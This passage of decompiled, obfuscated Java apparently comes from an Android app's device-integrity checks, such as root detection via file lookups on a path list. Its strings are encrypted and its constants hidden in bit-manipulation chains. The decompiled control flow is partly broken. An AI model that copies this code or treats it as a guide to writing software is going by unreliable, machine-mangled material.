                boolean W3 = W();
                boolean z3 = (V() ? 1 : 0) | (L(context) ? 1 : 0) | ((W3 ? 1 : 0) + i10 + 1 + (((-i10) - 1) | ((-(W3 ? 1 : 0)) - 1))) | (N(context) ? 1 : 0);
                boolean e02 = e0();
                byte[] bArr3 = {-36, -55};
                k(bArr3, new byte[]{28, -68, -81, -53, 115, -84, 25, -35});
                int i11 = (e02 ? 1 : 0) | (I(new String(bArr3, charset).intern()) ? 1 : 0);
                boolean P3 = P();
                int i12 = ((P3 ? 1 : 0) - 1) - ((~i11) | (P3 ? 1 : 0));
                byte[] bArr4 = {-119, -8, -88, -7, 11, 63, -123};
                k(bArr4, new byte[]{103, -3, 80, 105, 83, 38, 58, -35});
                boolean M3 = M(new String(bArr4, charset).intern());
                byte[] bArr5 = {97, -28, -8, 113, 89, 52, 59};
                k(bArr5, new byte[]{-12, 67, 91, 59, 126, 87, 87, 35});
                String intern2 = new String(bArr5, charset).intern();
                char c8 = 47099;
                char c9 = 47099;
                int i13 = 0;
                while (true) {
                    if (c9 == 62057) {
                        byte[] bArr6 = {86, 6, 84, 6, 5, -42, -47, -63, 117, 112, 47, -97, -27, -30, 60, 104, -62};
                        x(bArr6, new byte[]{53, 103, 58, 67, 125, -77, -78, -76, 1, 21, 108, -16, -120, -113, 93, 6, -90});
                        t(new String(bArr6, StandardCharsets.UTF_8).intern(), intern2);
                        c9 = 41452;
                        c8 = 47099;
                    } else if (c9 == c8) {
                        char c10 = 59558;
                        i13 = 0;
                        Object obj = null;
                        while (true) {
                            switch (c10) {
                                case 53544:
                                    i13 = 0;
                                    c10 = 36468;
                                case 36468:
                                    break;
                                case 59558:
                                    try {
                                        obj = E1.b(intern2);
                                    } catch (Exception e4) {
                                        obj = e4;
                                        c10 = 3580;
                                    }
                                    c10 = obj != null ? (char) 39744 : (char) 53544;
                                case 39744:
                                    i13 = 1;
                                    c10 = 36468;
                                case 3580:
                                    i13 = 0;
                                    break;
                                default:
                            }
                        }
                        c9 = i13 != 0 ? (char) 62057 : (char) 41452;
                    } else if (c9 != 41452) {
                        c9 = c8;
                    } else {
                        int i14 = (i13 + (M3 ? 1 : 0)) - (i13 & (M3 ? 1 : 0));
                        byte[] bArr7 = {34, 75, 62, -33, -35, 81, 42};
                        byte[] bArr8 = new byte[8];
                        bArr8[0] = 9;
                        bArr8[1] = 82;
                        bArr8[2] = 62;
                        bArr8[AbstractC0099x.a(1191283162, 2, -1191283163) ^ 1191283161] = -65;
                        bArr8[4] = -121;
                        bArr8[5] = -75;
                        bArr8[6] = -109;
                        bArr8[7] = -57;
                        k(bArr7, bArr8);
                        int i15 = i14 | (I(new String(bArr7, charset).intern()) ? 1 : 0) | (Z() ? 1 : 0);
                        boolean z4 = z3;
                        z4 = z3;
                        if (z3 == 0 && i12 == 0) {
                            z4 = Q(context);
                        }
                        boolean z5 = z4;
                        int i16 = i15 | (T() ? 1 : 0);
                        long j18 = b0() ? 1L : 0L;
                        long j19 = i16;
                        long j20 = (((((((((j18 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j18 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j18 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j18 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + ((((((((j19 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j19 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j19 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j19 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + 6148914691236517205L;
                        long j21 = (j20 >>> 48) & 43690;
                        long j22 = ((j21 >>> 2) | (j21 >>> 1)) & 858993459;
                        long j23 = (j22 | (j22 >>> 2)) & 252645135;
                        long j24 = (j20 >>> 32) & 43690;
                        long j25 = ((j24 >>> 2) | (j24 >>> 1)) & 858993459;
                        long j26 = (j25 | (j25 >>> 2)) & 252645135;
                        long j27 = (((j23 | (j23 >>> 4)) & 16711935) << 24) | (((j26 | (j26 >>> 4)) & 16711935) << 16);
                        long j28 = (j20 >>> 16) & 43690;
                        long j29 = ((j28 >>> 2) | (j28 >>> 1)) & 858993459;
                        long j30 = (j29 | (j29 >>> 2)) & 252645135;
                        long j31 = j20 & 43690;
                        long j32 = ((j31 >>> 2) | (j31 >>> 1)) & 858993459;
                        long j33 = (j32 | (j32 >>> 2)) & 252645135;
                        int i17 = (int) (((j33 | (j33 >>> 4)) & 16711935) | ((((j30 | (j30 >>> 4)) & 16711935) << 8) + j27));
                        int[] iArr = new int[0];
                        char c11 = 3054;
                        int i18 = 0;
                        while (true) {
                            if (c11 == 2762) {
                                l(iArr);
                                c11 = 28600;
                                i18 = 1;
                            } else if (c11 != 49766) {
                                if (c11 == 3054) {
                                    int nextInt = ThreadLocalRandom.current().nextInt();
                                    byte b4 = (byte) nextInt;
                                    byte b5 = (byte) (nextInt >>> 8);
                                    iArr = AbstractC0089u1.g(BNatives.f3739a.l(b4, b5), b4, b5, new C0013b0(this, 8));
                                    i18 = 0;
                                    if (iArr != null) {
                                    }
                                } else if (c11 == 28600) {
                                    int i19 = i17 | i18;
                                    int[] iArr2 = new int[0];
                                    char c12 = 47438;
                                    while (true) {
                                        if (c12 != 35860) {
                                            if (c12 == 47438) {
                                                int nextInt2 = ThreadLocalRandom.current().nextInt();
                                                byte b6 = (byte) nextInt2;
                                                byte b7 = (byte) (nextInt2 >>> 8);
                                                iArr2 = AbstractC0089u1.g(BNatives.f3739a.q(b6, b7), b6, b7, new C0013b0(this, 4));
                                                if (iArr2 != null) {
                                                    c12 = 35860;
                                                }
                                            } else if (c12 == 64249) {
                                                l(iArr2);
                                                i3 = 1;
                                            } else if (c12 == 43530) {
                                                i3 = 0;
                                            }
                                        } else {
                                            c12 = iArr2.length > 0 ? (char) 64249 : (char) 43530;
                                        }
                                    }
                                    int i20 = i3 | i19 | (d0() ? 1 : 0) | (R() ? 1 : 0);
                                    int[] iArr3 = new int[0];
                                    char c13 = 48577;
                                    while (true) {
                                        if (c13 == 28535) {
                                            c13 = iArr3.length > 0 ? (char) 48385 : (char) 55546;
                                        } else if (c13 == 48385) {
                                            l(iArr3);
                                            i4 = 1;
                                        } else if (c13 != 55546) {
                                            if (c13 == 48577) {
                                                int nextInt3 = ThreadLocalRandom.current().nextInt();
                                                byte b8 = (byte) nextInt3;
                                                byte b9 = (byte) (nextInt3 >>> 8);
                                                iArr3 = AbstractC0089u1.g(BNatives.f3739a.x(b8, b9), b8, b9, new C0013b0(this, 3));
                                                if (iArr3 != null) {
                                                    c13 = 28535;
                                                }
                                            }
                                        } else {
                                            i4 = 0;
                                        }
                                    }
                                    C0031f2 c0031f22 = new C0031f2(!z5, i12 == 0, (i4 + 1) + (i20 + (((-i4) - 1) | ((-i20) - 1))) == 0);
                                    c0031f22.f512d = Long.valueOf((System.nanoTime() / 1000000) - nanoTime);
                                    char c14 = 32652;
                                    boolean z6 = false;
                                    C0017c0 c0017c0 = null;
                                    while (true) {
                                        switch (c14) {
                                            case 40281:
                                                break;
                                            case 40431:
                                                c14 = 53018;
                                                c0017c0 = this;
                                            case 28598:
                                                c14 = 40281;
                                                z6 = true;
                                            case 46543:
                                                c14 = 40281;
                                                z6 = false;
                                            case 13343:
                                                c14 = !c0031f22.a() ? (char) 28598 : (char) 46543;
                                            case 53018:
                                                if (c0017c0.i.a()) {
                                                    c14 = 13343;
                                                }
                                            case 32652:
                                                if (this.i != null) {
                                                    c14 = 40431;
                                                }
                                            default:
                                        }
                                        c0031f2 = c0031f22;
                                        if (z6) {
                                            c7 = 53888;
                                            c6 = 64439;
                                        }
                                    }
                                }
                                c11 = 49766;
                            } else {
                                c11 = iArr.length > 0 ? (char) 2762 : (char) 28600;
                            }
                        }
                    }
                }
            }
            c7 = 50595;
            c6 = 64439;
        }
        C0054l1 c0054l1 = this.f434g;
        c0054l1.f573a.getClass();
        int i21 = AbstractC0041i0.f535a;
        this.f433f.f(W.f404j, c0031f2.a());
        byte[] bArr9 = {84, 73, 99, -48, 113, 45, -113, -10, -106, -7, 32, 122, 53, -123, 26, -37};
        byte[] bArr10 = new byte[16];
        bArr10[0] = 64;
        bArr10[B0.a(-1, 1)] = 41;
        bArr10[2] = -72;
        bArr10[3] = 8;
        bArr10[4] = 124;
        bArr10[5] = 119;
        long j34 = 876415926;
        long j35 = 876415982;
        long j36 = ((((((((j34 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j34 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j34 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j34 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + ((((((((j35 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j35 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j35 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j35 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
        long j37 = (j36 >>> 48) & 21845;
        long j38 = (j37 | (j37 >>> 1)) & 858993459;
        long j39 = (j38 | (j38 >>> 2)) & 252645135;
        long j40 = (j36 >>> 32) & 21845;
        long j41 = ((j40 >>> 1) | j40) & 858993459;
        long j42 = ((j41 >>> 2) | j41) & 252645135;
        long j43 = ((((j42 >>> 4) | j42) & 16711935) << 16) + (((j39 | (j39 >>> 4)) & 16711935) << 24);
        long j44 = (j36 >>> 16) & 21845;
        long j45 = ((j44 >>> 1) | j44) & 858993459;
        long j46 = ((j45 >>> 2) | j45) & 252645135;
        long j47 = ((((j46 >>> 4) | j46) & 16711935) << 8) | j43;
        long j48 = j36 & 21845;
        long j49 = ((j48 >>> 1) | j48) & 858993459;
        long j50 = ((j49 >>> 2) | j49) & 252645135;
        bArr10[6] = (int) (j47 | (((j50 >>> 4) | j50) & 16711935));
        bArr10[7] = 63;
        bArr10[8] = -97;
        bArr10[9] = -85;
        bArr10[10] = -109;
        bArr10[11] = -65;
        bArr10[12] = 50;
        bArr10[13] = -42;
        bArr10[14] = -1;
        bArr10[15] = 14;
        Y2.z(bArr9, bArr10);
        Charset charset2 = StandardCharsets.UTF_8;
        d(new String(bArr9, charset2).intern(), c0031f2);
        if (c0031f2.b()) {
            c4 = '\n';
            byte[] bArr11 = {-21, 45, -96, -75, 86, 62, -74, 23, 95, -87, -87, -28, -96, -96, 34, 49};
            c5 = 11;
            Y2.z(bArr11, new byte[]{-1, 77, 123, 109, 91, 100, 97, -34, 86, -5, 26, 33, -89, -13, -57, -28});
            String intern3 = new String(bArr11, charset2).intern();
            c0054l1.f573a.getClass();
            c(intern3);
        } else {
            c4 = '\n';
            c5 = 11;
        }
        if (c0031f2.a()) {
            c0054l1.f573a.getClass();
            byte[] bArr12 = new byte[16];
            bArr12[0] = -111;
            long j51 = -838794931;
            long j52 = -1;
            long j53 = (((((((((j51 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j51 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j51 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j51 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (((((((((j52 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j52 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j52 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j52 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
            long j54 = (j53 >>> 48) & 43690;
            long j55 = ((j54 >>> 2) | (j54 >>> 1)) & 858993459;
            long j56 = ((j55 >>> 2) | j55) & 252645135;
            long j57 = (j53 >>> 32) & 43690;
            long j58 = ((j57 >>> 2) | (j57 >>> 1)) & 858993459;
            long j59 = ((j58 >>> 2) | j58) & 252645135;
            long j60 = ((((j59 >>> 4) | j59) & 16711935) << 16) | ((((j56 >>> 4) | j56) & 16711935) << 24);
            long j61 = (j53 >>> 16) & 43690;
            long j62 = ((j61 >>> 2) | (j61 >>> 1)) & 858993459;
            long j63 = ((j62 >>> 2) | j62) & 252645135;
            long j64 = j53 & 43690;
            long j65 = ((j64 >>> 2) | (j64 >>> 1)) & 858993459;
            long j66 = ((j65 >>> 2) | j65) & 252645135;
            bArr12[1] = (((int) ((((j66 >>> 4) | j66) & 16711935) | (((((j63 >>> 4) | j63) & 16711935) << 8) | j60))) + 545311744) ^ (-293483205);
            bArr12[2] = -32;
            bArr12[3] = 4;
            bArr12[4] = -33;
            bArr12[5] = -48;
            bArr12[6] = 59;
            bArr12[7] = -40;
            bArr12[8] = -18;
            bArr12[9] = -115;
            bArr12[c4] = -23;
            bArr12[c5] = 106;
            long j67 = 243739516;
            long j68 = -2;
            long b10 = c3.b((((((((j67 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j67 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j67 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j67 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), ((((((((j68 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j68 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j68 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j68 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), 6148914691236517205L);
            long j69 = (b10 >>> 48) & 43690;
            long j70 = ((j69 >>> 2) | (j69 >>> 1)) & 858993459;
            long j71 = (j70 | (j70 >>> 2)) & 252645135;
            long j72 = (b10 >>> 32) & 43690;
            long j73 = ((j72 >>> 2) | (j72 >>> 1)) & 858993459;
            long j74 = ((j73 >>> 2) | j73) & 252645135;
            long j75 = (((j71 | (j71 >>> 4)) & 16711935) << 24) | ((((j74 >>> 4) | j74) & 16711935) << 16);
            long j76 = (b10 >>> 16) & 43690;
            long j77 = ((j76 >>> 2) | (j76 >>> 1)) & 858993459;
            long j78 = ((j77 >>> 2) | j77) & 252645135;
            long j79 = b10 & 43690;
            long j80 = ((j79 >>> 2) | (j79 >>> 1)) & 858993459;
            long j81 = (j80 | (j80 >>> 2)) & 252645135;
            int i22 = (int) (((j81 | (j81 >>> 4)) & 16711935) | (((((j78 >>> 4) | j78) & 16711935) << 8) + j75));
            long j82 = -1899479036;
            long j83 = i22;
            long j84 = (((((((((j82 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j82 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j82 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j82 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j83 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j83 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j83 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j83 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
            long j85 = (j84 >>> 48) & 43690;
            long j86 = ((j85 >>> 2) | (j85 >>> 1)) & 858993459;
            long j87 = (j86 | (j86 >>> 2)) & 252645135;
            long j88 = (j84 >>> 32) & 43690;
            long j89 = ((j88 >>> 2) | (j88 >>> 1)) & 858993459;
            long j90 = (j89 | (j89 >>> 2)) & 252645135;
            long j91 = (((j90 | (j90 >>> 4)) & 16711935) << 16) + (((j87 | (j87 >>> 4)) & 16711935) << 24);
            long j92 = (j84 >>> 16) & 43690;
            long j93 = ((j92 >>> 2) | (j92 >>> 1)) & 858993459;
            long j94 = (j93 | (j93 >>> 2)) & 252645135;
            long j95 = j84 & 43690;
            long j96 = ((j95 >>> 2) | (j95 >>> 1)) & 858993459;
            long j97 = (j96 | (j96 >>> 2)) & 252645135;
            int i23 = ((int) (((j97 | (j97 >>> 4)) & 16711935) | (((j94 | (j94 >>> 4)) & 16711935) << 8) | j91)) + 805310848;
            bArr12[(((~i23) & (-1094168184)) - ((-1094168184) & i23)) + i23] = 125;
            bArr12[13] = -127;
            bArr12[14] = -126;
            bArr12[15] = -102;
            Y2.z(bArr12, new byte[]{-123, 22, 59, -36, -46, -118, -20, 17, -25, -33, 90, -81, 122, -46, 103, 79});
            c0054l1.c(new String(bArr12, charset2).intern(), null);
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x0038. Please report as an issue. */
    public final boolean a0() {
        char c4;
        String[] strArr = new String[0];
        String str = null;
        int i = 0;
        int i3 = 0;
        char c5 = 29152;
        String str2 = null;
        while (true) {
            switch (c5) {
                case 43518:
                    return false;
                case 4000:
                    str2 = strArr[i];
                    byte[] bArr = {-104, 64};
                    z(bArr, new byte[]{-21, 53, 41, -120, 125, 46, 106, 4});
                    c4 = new File(str2, new String(bArr, StandardCharsets.UTF_8).intern()).exists() ? (char) 22750 : (char) 23070;
                    c5 = c4;
                case 9113:
                    if (i < i3) {
                        c4 = 4000;
                        c5 = c4;
                    }
                    c4 = 43518;
                    c5 = c4;
                case 23070:
                    i++;
                    c5 = 9113;
                case 2863:
                    byte[] bArr2 = {28};
                    z(bArr2, new byte[]{38, -11, 19, -1, 117, 35, -6, 113});
                    strArr = str.split(new String(bArr2, StandardCharsets.UTF_8).intern());
                    i3 = strArr.length;
                    i = 0;
                    c5 = 9113;
                case 22750:
                    byte[] bArr3 = {-92, -84, -24, -18, 74, 122, -109, -107, -65, 63};
                    byte[] bArr4 = new byte[10];
                    bArr4[0] = -87;
                    bArr4[1] = -51;
                    bArr4[2] = 45;
                    bArr4[3] = 57;
                    bArr4[4] = -71;
                    bArr4[5] = 33;
                    long j2 = 273702933;
                    long j3 = 0;
                    long j4 = (((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                    long j5 = (j4 >>> 48) & 43690;
                    long j6 = ((j5 >>> 2) | (j5 >>> 1)) & 858993459;
                    long j7 = ((j6 >>> 2) | j6) & 252645135;
                    long j8 = (j4 >>> 32) & 43690;
                    long j9 = ((j8 >>> 2) | (j8 >>> 1)) & 858993459;
                    long j10 = ((j9 >>> 2) | j9) & 252645135;
                    long j11 = ((((j10 >>> 4) | j10) & 16711935) << 16) + ((((j7 >>> 4) | j7) & 16711935) << 24);
                    long j12 = (j4 >>> 16) & 43690;
                    long j13 = ((j12 >>> 2) | (j12 >>> 1)) & 858993459;
                    long j14 = ((j13 >>> 2) | j13) & 252645135;
                    long j15 = j4 & 43690;
                    long j16 = ((j15 >>> 2) | (j15 >>> 1)) & 858993459;
                    long j17 = ((j16 >>> 2) | j16) & 252645135;
                    bArr4[6] = 299004100 ^ (294805633 + (((int) ((((j17 >>> 4) | j17) & 16711935) | (((((j14 >>> 4) | j14) & 16711935) << 8) | j11))) | 4198420));
                    bArr4[7] = 86;
                    long j18 = 17858576;
                    long j19 = 0;
                    long j20 = (((((((((j18 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j18 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j18 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j18 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (((((((((j19 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j19 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j19 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j19 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + 6148914691236517205L;
                    long j21 = (j20 >>> 48) & 43690;
                    long j22 = ((j21 >>> 2) | (j21 >>> 1)) & 858993459;
                    long j23 = ((j22 >>> 2) | j22) & 252645135;
                    long j24 = (j20 >>> 32) & 43690;
                    long j25 = ((j24 >>> 2) | (j24 >>> 1)) & 858993459;
                    long j26 = ((j25 >>> 2) | j25) & 252645135;
                    long j27 = ((((j26 >>> 4) | j26) & 16711935) << 16) + ((((j23 >>> 4) | j23) & 16711935) << 24);
                    long j28 = (j20 >>> 16) & 43690;
                    long j29 = ((j28 >>> 2) | (j28 >>> 1)) & 858993459;
                    long j30 = ((j29 >>> 2) | j29) & 252645135;
                    long j31 = j20 & 43690;
                    long j32 = ((j31 >>> 2) | (j31 >>> 1)) & 858993459;
                    long j33 = (j32 | (j32 >>> 2)) & 252645135;
                    bArr4[(-2062222576) ^ ((-2080081144) + ((int) ((((((j30 >>> 4) | j30) & 16711935) << 8) | j27) | ((j33 | (j33 >>> 4)) & 16711935))))] = -53;
                    bArr4[9] = 87;
                    z(bArr3, bArr4);
                    t(new String(bArr3, StandardCharsets.UTF_8).intern(), str2);
                    return true;
                case 29152:
                    long j34 = 145037824;
                    long j35 = -1;
                    long j36 = ((((((((j34 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j34 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j34 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j34 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j35 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j35 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j35 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j35 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
                    long j37 = (j36 >>> 48) & 43690;
                    long j38 = ((j37 >>> 2) | (j37 >>> 1)) & 858993459;
                    long j39 = ((j38 >>> 2) | j38) & 252645135;
                    long j40 = (j36 >>> 32) & 43690;
                    long j41 = ((j40 >>> 2) | (j40 >>> 1)) & 858993459;
                    long j42 = ((j41 >>> 2) | j41) & 252645135;
                    long j43 = ((((j42 >>> 4) | j42) & 16711935) << 16) | ((((j39 >>> 4) | j39) & 16711935) << 24);
                    long j44 = (j36 >>> 16) & 43690;
                    long j45 = ((j44 >>> 2) | (j44 >>> 1)) & 858993459;
                    long j46 = ((j45 >>> 2) | j45) & 252645135;
                    long j47 = ((((j46 >>> 4) | j46) & 16711935) << 8) + j43;
                    long j48 = j36 & 43690;
                    long j49 = ((j48 >>> 2) | (j48 >>> 1)) & 858993459;
                    long j50 = (j49 | (j49 >>> 2)) & 252645135;
                    long j51 = -145596142;
                    long j52 = ((int) (((j50 | (j50 >>> 4)) & 16711935) | j47)) + 558208;
                    long j53 = (((((((((j51 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j51 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j51 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j51 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + ((((((((j52 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j52 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j52 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j52 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                    long j54 = (j53 >>> 48) & 21845;
                    long j55 = ((j54 >>> 1) | j54) & 858993459;
                    long j56 = ((j55 >>> 2) | j55) & 252645135;
                    long j57 = (j53 >>> 32) & 21845;
                    long j58 = ((j57 >>> 1) | j57) & 858993459;
                    long j59 = ((j58 >>> 2) | j58) & 252645135;
                    long j60 = ((((j59 >>> 4) | j59) & 16711935) << 16) + ((((j56 >>> 4) | j56) & 16711935) << 24);
                    long j61 = (j53 >>> 16) & 21845;
                    long j62 = ((j61 >>> 1) | j61) & 858993459;
                    long j63 = ((j62 >>> 2) | j62) & 252645135;
                    long j64 = j53 & 21845;
                    long j65 = ((j64 >>> 1) | j64) & 858993459;
                    long j66 = ((j65 >>> 2) | j65) & 252645135;
                    byte[] bArr5 = {-52, (int) (((((j63 >>> 4) | j63) & 16711935) << 8) | j60 | (((j66 >>> 4) | j66) & 16711935)), -76, 107};
                    long j67 = -1;
                    long j68 = 0;
                    long j69 = ((((((((j67 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j67 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j67 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j67 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + ((((((((j68 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j68 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j68 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j68 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                    long j70 = (j69 >>> 48) & 21845;
                    long j71 = ((j70 >>> 1) | j70) & 858993459;
                    long j72 = ((j71 >>> 2) | j71) & 252645135;
                    long j73 = (j69 >>> 32) & 21845;
                    long j74 = ((j73 >>> 1) | j73) & 858993459;
                    long j75 = ((j74 >>> 2) | j74) & 252645135;
                    long j76 = ((((j75 >>> 4) | j75) & 16711935) << 16) | ((((j72 >>> 4) | j72) & 16711935) << 24);
                    long j77 = (j69 >>> 16) & 21845;
                    long j78 = ((j77 >>> 1) | j77) & 858993459;
